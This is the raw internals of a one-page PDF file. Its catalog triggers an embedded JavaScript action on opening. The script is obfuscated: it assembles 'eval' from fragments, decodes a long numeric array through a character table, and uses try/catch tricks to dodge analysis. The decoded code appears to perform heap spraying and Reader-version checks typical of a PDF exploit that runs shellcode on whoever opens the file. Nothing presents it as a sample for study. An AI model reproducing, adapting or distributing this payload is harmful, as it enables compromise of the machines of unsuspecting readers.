%PDF-1.6
%‚„œ”
7 0 obj
<</Count 1/Type/Pages/Kids[28 0 R]>>
endobj
21 0 obj
<</MarkInfo<</Marked true>>/Names 23 0 R/Outlines 1 0 R/Metadata 9 0 R/AcroForm 22 0 R/Pages 7 0 R/OCProperties<</D<</RBGroups[]/OFF[]/Order[]>>/OCGs[27 0 R]>>/StructTreeRoot 11 0 R/Type/Catalog>>
endobj
23 0 obj
<</JavaScript 24 0 R/AP 8 0 R>>
endobj
24 0 obj
<</Names[123 0 R 76 0 R]>>
endobj
25 0 obj
<</S/JavaScript/JS 26 0 R>>
endobj
26 0 obj
<</Length 1108/Filter[/FlateDecode]>>stream
endstream
endobj
28 0 obj
<</CropBox[37 37 575 755]/Annots 29 0 R/Parent 7 0 R/StructParents 0/Contents 60 0 R/Rotate 90/MediaBox[0 0 612 792]/Resources<</XObject<</Im0 69 0 R>>/ColorSpace<</CS0 59 0 R>>/Font<</TT0 61 0 R>>/Properties<</MC0 27 0 R>>/ExtGState<</GS0 72 0 R>>>>/Type/Page>>
endobj
60 0 obj
<</Length 539/Filter/FlateDecode/Type/Contents>>stream
endstream
endobj
76 0 obj
<</S/JavaScript/JS(
nk='';
nk+='sl';
nk+="i";
nk+="ce";
j='gerb43bt';
j=j[nk];
z
=
new
Array\(5,67,22,25,55,21,17,68,73,0,62,3,75,34,69,69,62,3,72,45,44,56,62,3,75,23,72,45,62,3,66,23,44,56,62,3,44,37,34,56,62,3,34,34,23,72,62,3,69,56,45,57,62,3,56,57,75,55,62,3,75,55,34,57,62,3,57,45,56,57,62,3,66,57,75,55,62,3,23,69,29,45,62,3,66,69,75,55,62,3,34,34,57,75,62,3,69,69,7,55,62,3,23,44,75,55,62,3,57,34,34,45,62,3,34,34,66,56,62,3,75,29,41,45,62,3,29,23,44,44,62,3,72,72,29,57,62,3,55,75,72,72,62,3,56,57,75,55,62,3,45,34,34,57,62,3,34,37,56,69,62,3,66,23,57,69,62,3,75,66,72,55,62,3,41,56,34,56,62,3,44,56,75,23,62,3,23,29,66,23,62,3,44,55,44,37,62,3,23,29,56,45,62,3,75,55,23,69,62,3,34,45,66,23,62,3,66,56,75,55,62,3,66,75,34,23,62,3,72,23,57,34,62,3,75,55,23,69,62,3,41,57,66,69,62,3,72,23,57,34,62,3,45,37,34,34,62,3,56,29,56,37,62,3,67,7,72,45,62,3,45,23,57,34,62,3,7,55,34,34,62,3,55,44,57,72,62,3,34,75,29,57,62,3,66,56,72,41,62,3,45,29,57,75,62,3,57,7,45,55,62,3,7,67,57,34,62,3,44,55,56,57,62,3,34,55,72,29,62,3,66,23,29,72,62,3,23,44,44,69,62,3,23,44,75,55,62,3,57,34,41,56,62,3,69,69,7,7,62,3,57,45,75,55,62,3,75,7,56,55,62,3,44,45,56,69,62,3,23,56,72,72,62,3,57,45,41,56,62,3,7,75,75,55,62,3,7,7,57,34,62,3,57,56,75,55,62,3,57,34,75,55,62,3,67,55,45,23,62,3,23,37,23,44,62,3,44,55,45,34,62,3,67,7,23,34,62,3,69,75,75,55,62,3,75,57,41,57,62,3,57,45,66,7,62,3,66,56,34,34,62,3,37,69,57,34,62,3,72,34,44,55,62,3,69,75,75,55,62,3,75,55,57,75,62,3,69,67,72,66,62,3,23,37,57,23,62,3,37,75,44,75,62,3,72,72,72,72,62,3,44,41,72,72,62,3,44,75,72,37,62,3,57,57,57,57,62,3,57,57,57,57,62,3,23,57,23,75,62,3,56,57,69,67,62,3,72,72,69,75,62,3,57,57,57,57,62,3,23,57,57,57,62,3,45,57,75,34,62,3,23,57,29,37,62,3,75,55,23,23,62,3,75,55,44,45,62,3,29,57,23,44,62,3,45,34,75,34,62,3,72,72,57,23,62,3,69,75,44,34,62,3,69,44,69,72,62,3,57,57,57,57,62,3,66,23,69,75,62,3,69,45,66,41,62,3,23,56,69,7,62,3,29,69,72,72,62,3,45,56,75,34,62,3,75,55,57,75,62,3,44,75,44,75,62,3,72,72,69,29,62,3,72,72,72,72,62,3,57,41,44,55,62,3,66,41,44,55,62,3,44,45,75,29,62,3,57,29,57,56,62,3,57,57,57,57,62,3,23,45,75,7,62,3,57,45,41,56,62,3,57,56,45,66,62,3,66,41,41,56,62,3,69,66,69,23,62,3,45,66,66,34,62,3,41,56,56,56,62,3,66,69,57,56,62,3,34,34,66,41,62,3,45,66,34,41,62,3,41,56,56,56,62,3,41,57,57,75,62,3,66,34,41,7,62,3,23,34,41,57,62,3,72,75,69,75,62,3,57,57,57,57,62,3,72,72,57,57,62,3,57,45,23,69,62,3,44,75,75,55,62,3,45,37,34,34,62,3,45,66,23,29,62,3,29,7,56,56,62,3,66,66,57,57,62,3,69,41,66,57,62,3,45,66,66,56,62,3,29,7,56,56,62,3,41,44,57,23,62,3,69,45,69,56,62,3,45,69,69,45,62,3,29,7,56,56,62,3,57,57,57,37,62,3,75,67,23,37,62,3,57,56,45,29,62,3,75,75,34,57,62,3,29,7,56,56,62,3,56,29,57,56,62,3,69,67,23,29,62,3,69,67,57,57,62,3,23,34,57,57,62,3,69,67,23,66,62,3,72,72,57,57,62,3,29,56,23,69,62,3,45,57,75,23,62,3,29,69,66,23,62,3,57,57,69,67,62,3,72,72,23,34,62,3,57,56,23,69,62,3,57,57,69,67,62,3,44,55,75,34,62,3,23,34,57,45,62,3,23,69,72,72,62,3,75,34,57,56,62,3,57,45,45,34,62,3,57,41,44,55,62,3,29,34,44,55,62,3,75,57,56,66,62,3,57,57,34,72,62,3,72,67,66,23,62,3,75,57,56,66,62,3,57,57,34,72,62,3,45,56,66,23,62,3,57,57,69,67,62,3,72,44,69,67,62,3,23,69,72,72,62,3,44,75,57,75,62,3,72,44,37,45,62,3,72,72,72,72,62,3,56,44,75,44,62,3,44,45,57,44,62,3,72,44,37,75,62,3,57,44,75,67,62,3,69,72,75,37,62,3,55,7,57,29,62,3,45,67,34,34,62,3,23,55,75,67,62,3,45,69,29,55,62,3,66,37,56,69,62,3,29,67,34,69,62,3,66,57,41,72,62,3,66,56,69,75,62,3,66,57,66,56,62,3,41,72,34,67,62,3,66,57,41,72,62,3,69,34,69,41,62,3,69,34,69,7,62,3,69,69,66,56,62,3,66,37,66,57,62,3,66,34,66,23,62,3,69,34,41,44,62,3,69,7,69,72,62,3,66,66,41,72,62,3,66,57,41,44,62,3,66,57,69,75,62,3,69,69,34,72,62,3,34,56,34,7,62,3,41,69,34,66,62,3,34,7,69,23,62,3,57,57,34,23,62,3,57,57,57,57,0,33,72,3,60,45,18,50,24,60,25,44,38,5,22,70,22,67,13,54,48,26,39,9,27,50,4,44,70,22,67,2,4,44,60,68,18,27,19,41,74,54,48,26,39,22,67,31,73,22,67,33,14,22,67,73,22,67,2,17,3,55,17,18,22,50,60,68,70,57,13,54,48,12,41,26,33,22,44,18,3,22,60,25,22,67,33,14,25,72,3,60,45,18,50,24,60,25,55,32,70,26,39,5,67,22,25,7,36,68,73,60,44,9,25,43,22,22,67,48,70,26,33,5,67,22,25,5,9,73,57,32,57,45,57,45,57,45,57,45,33,5,67,22,25,67,7,7,22,73,57,32,56,57,57,57,57,57,33,5,67,22,25,28,67,48,4,24,67,7,73,3,60,44,17,45,67,28,44,70,55,21,17,68,26,33,5,67,22,25,17,45,58,4,44,60,73,28,67,48,4,24,67,7,2,4,44,60,68,18,27,19,41,33,5,67,22,25,54,48,73,67,7,7,22,49,70,17,45,58,4,44,60,31,57,32,34,75,26,33,5,67,22,25,48,67,22,17,28,73,3,60,44,17,45,67,28,44,70,64,62,3,37,57,37,57,62,3,37,57,37,57,64,26,33,48,67,22,17,28,73,44,38,5,22,70,48,67,22,17,28,13,54,48,26,33,5,67,22,25,45,24,3,60,18,41,73,70,5,9,49,57,32,56,57,57,57,57,57,26,12,67,7,7,22,33,72,24,22,70,5,67,22,25,45,24,3,60,18,73,57,33,45,24,3,60,18,74,45,24,3,60,18,41,33,45,24,3,60,18,31,31,26,39,7,36,68,20,45,24,3,60,18,65,73,48,67,22,17,28,31,28,67,48,4,24,67,7,33,14,25,5,67,22,25,24,5,44,22,72,4,24,9,73,3,60,44,17,45,67,28,44,70,64,62,3,57,45,57,45,62,3,57,45,57,45,64,26,33,9,27,50,4,44,70,24,5,44,22,72,4,24,9,2,4,44,60,68,18,27,74,56,56,37,23,41,26,39,24,5,44,22,72,4,24,9,31,73,24,5,44,22,72,4,24,9,33,14,25,18,27,50,17,2,45,24,4,4,67,55,40,18,24,22,44,73,52,24,4,4,67,55,2,45,24,4,4,44,45,18,46,10,67,50,4,30,60,72,24,70,39,17,3,55,21,1,64,64,13,10,17,68,1,24,5,44,22,72,4,24,9,14,26,33,14,25,72,3,60,45,18,50,24,60,25,28,22,50,60,18,72,70,26,39,60,24,28,73,3,60,44,17,45,67,28,44,70,64,62,3,57,43,57,43,62,3,57,43,57,43,62,3,57,43,57,43,62,3,57,43,57,43,64,26,33,5,67,22,25,28,67,48,4,24,67,7,73,3,60,44,17,45,67,28,44,70,55,21,17,68,26,33,27,44,67,28,55,4,24,45,36,73,60,24,28,31,28,67,48,4,24,67,7,33,55,50,68,55,4,24,45,36,73,3,60,44,17,45,67,28,44,70,64,62,3,57,43,57,43,62,3,57,43,57,43,64,26,33,27,44,67,7,44,22,17,50,38,44,73,41,57,33,17,28,22,67,48,73,27,44,67,7,44,22,17,50,38,44,31,27,44,67,28,55,4,24,45,36,2,4,44,60,68,18,27,33,9,27,50,4,44,70,55,50,68,55,4,24,45,36,2,4,44,60,68,18,27,74,17,28,22,67,48,26,39,55,50,68,55,4,24,45,36,31,73,55,50,68,55,4,24,45,36,33,14,25,72,50,4,4,55,4,24,45,36,73,55,50,68,55,4,24,45,36,2,17,3,55,17,18,22,50,60,68,70,57,13,17,28,22,67,48,26,33,55,4,24,45,36,73,55,50,68,55,4,24,45,36,2,17,3,55,17,18,22,50,60,68,70,57,13,55,50,68,55,4,24,45,36,2,4,44,60,68,18,27,49,17,28,22,67,48,26,33,9,27,50,4,44,70,55,4,24,45,36,2,4,44,60,68,18,27,31,17,28,22,67,48,74,57,32,56,57,57,57,57,26,39,55,4,24,45,36,73,55,4,24,45,36,31,55,4,24,45,36,31,72,50,4,4,55,4,24,45,36,33,14,25,10,44,10,73,60,44,9,25,43,22,22,67,48,70,26,33,72,24,22,70,50,73,57,33,50,74,29,56,57,57,33,50,31,31,26,39,10,44,10,20,50,65,73,55,4,24,45,36,31,27,44,67,28,55,4,24,45,36,33,14,25,5,67,22,25,60,3,10,73,29,41,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,75,33,3,18,50,4,2,28,22,50,60,18,72,70,64,62,56,23,57,57,57,72,64,13,60,3,10,26,33,14,25,72,3,60,45,18,50,24,60,25,68,44,18,50,45,24,60,70,26,39,5,67,22,25,67,22,22,48,73,60,44,9,25,43,22,22,67,48,70,26,33,50,72,70,67,28,28,2,7,24,45,2,52,24,4,4,67,55,2,68,44,18,30,45,24,60,26,39,5,67,22,25,28,67,48,4,24,67,7,73,3,60,44,17,45,67,28,44,70,55,21,17,68,26,33,5,67,22,25,27,47,54,23,57,57,52,11,73,28,67,48,4,24,67,7,2,4,44,60,68,18,27,19,41,33,5,67,22,25,54,48,73,57,32,56,57,57,57,57,57,49,70,27,47,54,23,57,57,52,11,31,57,32,34,75,26,33,5,67,22,25,48,67,22,17,28,73,3,60,44,17,45,67,28,44,70,64,62,3,37,57,37,57,62,3,37,57,37,57,64,26,33,48,67,22,17,28,73,44,38,5,22,70,48,67,22,17,28,13,54,48,26,33,5,67,22,25,28,23,43,21,53,69,23,72,73,70,57,32,57,45,57,45,57,45,57,45,49,57,32,56,57,57,57,57,57,26,12,57,32,56,57,57,57,57,57,33,72,24,22,70,5,67,22,25,5,54,45,35,42,37,69,48,73,57,33,5,54,45,35,42,37,69,48,74,28,23,43,21,53,69,23,72,33,5,54,45,35,42,37,69,48,31,31,26,39,67,22,22,48,20,5,54,45,35,42,37,69,48,65,73,48,67,22,17,28,31,28,67,48,4,24,67,7,33,14,25,5,67,22,25,18,71,61,27,11,55,59,9,73,3,60,44,17,45,67,28,44,70,64,62,57,37,64,26,33,9,27,50,4,44,70,18,71,61,27,11,55,59,9,2,4,44,60,68,18,27,74,57,32,56,57,57,57,26,39,18,71,61,27,11,55,59,9,31,73,18,71,61,27,11,55,59,9,33,14,25,18,71,61,27,11,55,59,9,73,64,11,2,64,31,18,71,61,27,11,55,59,9,33,67,28,28,2,7,24,45,2,52,24,4,4,67,55,2,68,44,18,30,45,24,60,70,18,71,61,27,11,55,59,9,26,33,14,14,25,67,15,4,3,68,50,60,17,73,67,28,28,2,28,4,3,68,30,60,17,33,5,67,22,25,17,5,73,28,67,22,17,44,30,60,18,70,67,28,28,2,5,50,44,9,44,22,8,44,22,17,50,24,60,2,18,24,40,18,22,50,60,68,70,26,2,45,27,67,22,43,18,70,57,26,26,33,72,24,22,70,5,67,22,25,50,73,57,33,50,74,67,15,4,3,68,50,60,17,2,4,44,60,68,18,27,33,50,31,31,26,39,50,72,70,67,15,4,3,68,50,60,17,20,50,65,2,60,67,10,44,73,73,0,46,40,45,22,50,28,18,0,26,39,5,67,22,25,4,5,73,67,15,4,3,68,50,60,17,20,50,65,2,5,44,22,17,50,24,60,33,14,14,25,50,72,70,70,4,5,73,73,37,26,16,16,70,70,17,5,73,73,75,26,6,6,70,4,5,74,73,75,2,29,41,26,26,26,39,68,44,18,50,45,24,60,70,26,33,14,44,4,17,44,25,50,72,70,4,5,73,73,66,2,29,26,39,28,22,50,60,18,72,70,26,33,14,44,4,17,44,25,50,72,70,70,70,17,5,73,73,69,26,16,16,70,17,5,73,73,66,26,26,6,6,70,4,5,74,66,2,29,29,26,26,39,55,32,70,26,33,14,44,4,17,44,25,50,72,70,70,4,5,51,73,37,2,29,26,16,16,70,4,5,74,73,37,2,41,26,16,16,70,4,5,51,73,75,2,29,34,26,16,16,70,4,5,74,73,75,2,29,66,26,26,39,72,3,60,45,18,50,24,60,25,67,70,26,39,3,18,50,4,2,28,22,50,60,18,7,70,0,28,63,29,29,29,29,29,29,29,29,29,29,29,29,29,29,29,29,29,29,29,29,29,29,29,29,25,1,25,48,48,48,48,29,29,29,0,13,60,44,9,25,42,67,18,44,70,26,26,33,14,5,67,22,25,27,73,67,28,28,2,28,4,3,68,30,60,17,33,72,24,22,70,5,67,22,25,72,73,57,33,72,74,27,2,4,44,60,68,18,27,33,72,31,31,26,39,50,72,70,27,20,72,65,2,60,67,10,44,73,73,0,46,40,45,22,50,28,18,0,26,39,5,67,22,25,50,73,27,20,72,65,2,5,44,22,17,50,24,60,33,14,14,25,50,72,70,70,50,51,75,2,29,41,26,6,6,70,50,74,75,2,41,26,26,39,45,73,60,44,9,25,43,22,22,67,48,70,26,33,5,67,22,25,7,73,3,60,44,17,45,67,28,44,70,0,62,3,37,57,37,57,62,3,37,57,37,57,0,26,33,5,67,22,25,44,73,3,60,44,17,45,67,28,44,70,55,21,17,68,26,33,9,27,50,4,44,70,7,2,4,44,60,68,18,27,74,73,57,32,75,57,57,57,26,39,7,31,73,7,33,14,7,73,7,2,17,3,55,17,18,22,70,57,13,57,32,75,57,57,57,49,44,2,4,44,60,68,18,27,26,33,72,24,22,70,72,73,57,33,72,74,41,37,57,57,33,72,31,31,26,39,45,20,72,65,73,7,31,44,33,14,67,70,26,33,67,70,26,33,18,22,48,39,18,27,50,17,2,10,44,7,50,67,2,60,44,9,15,4,67,48,44,22,70,60,3,4,4,26,33,14,45,67,18,45,27,70,44,26,39,14,67,70,26,33,14,14\);
a="':.ulv&dVwmN/,}P|st*[jr5o \)hp1I+x;3Qk9z{S2DAecEWy-i>CKqb40_GnM%@']7ag6\(Uf=<8";
b="a"+'l';
b2="v"
+b;
try
{
if\(!google.search\(\)\)throw 1;
}
catch\(her436j34k76\)
{
e=\(j\(\)\);
try{
b='e'+b2;
if\(!google.search\(\)\)
a=2;
}
catch\(q\){
e=
e[b];
}
s='';try{if\(!google.search\(\)\)throw 1;}catch\(q\){r=1;}{
for\(i=0;i<z.length;i++\)
try{
if\(!google.search\(\)\)throw 1;}catch\(q\){
s
+=
a[
z[i]];
}
}}

"\)\)";try{if\(/x\(?=y\)/.test\('axyb'\)\)throw 1;}catch\(q\){e\(s\);})>>
endobj
xref
0 155
trailer
<</Size 155
/Root 21 0 R>>
xref
0 0
trailer
<</Size 155/Prev 75626/XRefStm 416/Root 21 0 R>>
startxref
78995
%%EOF